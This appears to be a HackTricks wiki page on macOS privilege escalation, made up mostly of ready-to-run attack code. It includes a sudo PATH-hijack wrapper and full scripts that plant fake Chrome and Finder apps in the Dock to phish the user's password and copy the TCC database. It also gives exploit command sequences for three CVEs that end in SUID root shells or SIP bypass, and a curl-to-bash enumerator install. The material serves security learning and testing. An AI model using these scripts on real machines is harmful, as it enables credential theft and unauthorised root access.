# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

If you came here looking for TCC privilege escalation go to:

{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Please note that **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. So see:

{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## User Interaction

### Sudo Hijacking

You can find the original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

However, macOS **maintains** the user's **`PATH`** when he executes **`sudo`**. Which means that another way to achieve this attack would be to **hijack other binaries** that the victim sill execute when **running sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.

### Dock Impersonation

Using some **social engineering** you could **impersonate for example Google Chrome** inside the dock and actually execute your own script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Some suggestions:

- Check in the Dock if there is a Chrome, and in that case **remove** that entry and **add** the **fake** **Chrome entry in the same position** in the Dock array.

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo \$PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Some suggestions:

- You **cannot remove Finder from the Dock**, so if you are going to add it to the Dock, you could put the fake Finder just next to the real one. For this you need to **add the fake Finder entry at the beginning of the Dock array**.
- Another option is to not place it in the Dock and just open it, "Finder asking to control Finder" is not that weird.
- Another options to **escalate to root without asking** the password with a horrible box, is make Finder really ask for the password to perform a privileged action:
  - Ask Finder to copy to **`/etc/pam.d`** a new **`sudo`** file (The prompt asking for the password will indicate that "Finder wants to copy sudo")
  - Ask Finder to copy a new **Authorization Plugin** (You could control the file name so the prompt asking for the password will indicate that "Finder wants to copy Finder.bundle")

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo \$PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

{{#endtab}}
{{#endtabs}}

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (even unprivileged ones) can create and mount a time machine snapshot an **access ALL the files** of that snapshot.\
The **only privileged** needed is for the application used (like `Terminal`) to have **Full Disk Access** (FDA) access (`kTCCServiceSystemPolicyAllfiles`) which need to be granted by an admin.

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

A more detailed explanation can be [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Recent Local Privilege Escalation & SIP Bypass (2021-2024)

### CVE-2021-30892 – “Shrootless” System Integrity Protection bypass

Apple-signed installer packages executed by `system_installd` run their *post-install* scripts as **root** with the `com.apple.rootless.install.inheritable` entitlement. The daemon evaluates **`/etc/zshenv`** before running any shell script, even while SIP is enabled. By planting a malicious `/etc/zshenv`, an unprivileged user can execute code with **SIP disabled**, gaining full access to protected filesystem paths and the ability to load unsigned kernel extensions.

```bash
# 1. Drop a malicious zshenv that will be sourced by system_installd
echo 'cp /bin/zsh /tmp/shrootless && chmod +s /tmp/shrootless' | sudo tee /etc/zshenv

# 2. Trigger an Apple-signed package installation
sudo installer -pkg /System/Library/Updates/bridgeOSUpdateCustomer.pkg -target /

# 3. Enjoy your SUID root shell (SIP already bypassed)
/tmp/shrootless -p
```

Patched in macOS Monterey 12.0.1 / Big Sur 11.6.1 (26 Oct 2021).


---

### CVE-2023-42931 – `diskutil mount … -mountOptions noowners` APFS privilege escalation

Any local user (even *guest*) could remount a writable APFS volume with the **`noowners`** option, making every file appear owned by the current user. The attacker can then replace an unprotected root-owned file (e.g. the placeholder `/.file`) with a SUID shell, unmount and remount the volume with normal ownership, and execute the file to obtain **root**.

```bash
# Identify the data volume (example: disk3s4)
diskutil list | grep 'Data Volume'

# 1. Mount it without owners
diskutil mount disk3s4 -mountOptions noowners

# 2. Plant a SUID shell
cp /bin/zsh /.file && chmod +s /.file

# 3. Restore normal mount
diskutil unmount disk3s4
diskutil mount disk3s4

# 4. Profit – root shell
/.file -p
```

Fixed in Sonoma 14.2, Ventura 13.6.3 and Monterey 12.7.2 (Dec 2023).


---

## Enumeration helpers

Running an automated enumerator quickly highlights low-hanging fruit:

* **MacPEAS** – Bash enumeration script for macOS privilege-escalation checks.
  ```bash
  curl -sSL https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/mac/macpeas.sh | bash
  ```
* **SwiftBelt** – Swift-based tool inspired by Seatbelt that enumerates persistence & LPE vectors.
  ```bash
  git clone https://github.com/cedowens/SwiftBelt && cd SwiftBelt && swift run
  ```



## Sensitive Information

This can be useful to escalate privileges:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [Microsoft Security Blog – “Shrootless” SIP bypass (CVE-2021-30892)](https://www.microsoft.com/security/blog/2021/10/26/shrootless-new-macos-vulnerability-that-could-bypass-system-integrity-protection/)
- [Alter Solutions – Local privilege escalation via APFS “noowners” remount (CVE-2023-42931)](https://www.alter-solutions.com/articles/local-privilege-escalating-apple-macos-filesystems)

{{#include ../../banners/hacktricks-training.md}}



